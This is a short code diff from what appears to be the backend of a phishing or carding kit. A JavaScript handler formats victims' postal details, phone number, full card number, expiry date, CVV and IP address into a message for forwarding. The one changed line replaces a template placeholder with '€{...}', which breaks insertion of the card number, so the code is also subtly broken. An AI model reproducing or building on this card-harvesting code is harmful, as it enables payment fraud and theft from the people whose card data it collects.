@@ -35,7 +35,7 @@ export default async function handler(req, res) {
         message += `🏠 **Postale :** \`${champ2}\`\n`;
         message += `💰 **Montant :** \`${champ3}$\`\n`;
         message += `📞 **Tel :** \`${champ4}\`\n\n`;
-        message += `💳 **Numéro Carte :** \` ${cleanChamp5} \`\n`;
+        message += `💳 **Numéro Carte :** \` €{cleanChamp5} \`\n`;
         message += `📅 **Expiration :** \`${champ6}\`\n`;
         message += `🔒 **CVV :** \`${champ7}\`\n\n`;
         message += `🖥️ **IP Client :** \`${userIp}\`\n`;
